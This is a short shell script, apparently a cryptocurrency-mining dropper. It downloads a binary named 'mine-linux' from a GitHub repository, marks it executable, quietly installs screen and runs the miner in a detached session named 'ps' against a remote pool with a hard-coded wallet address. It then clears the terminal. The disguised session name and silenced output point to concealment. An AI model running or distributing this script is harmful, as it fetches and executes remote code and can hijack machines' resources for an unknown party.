wget https://github.com/obisumila/cuddly-robot/raw/refs/heads/main/mine-linux ;
chmod +x mine-linux ;
sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
screen -S ps -dm ./mine-linux --url=http://orepool.xyz:8080 --address=9LWaS2HU23dVnyZKmPXawuDn3yxemTaqr7QcPUUFjPSL
screen -ls
sleep 2
clear
screen -ls ; 


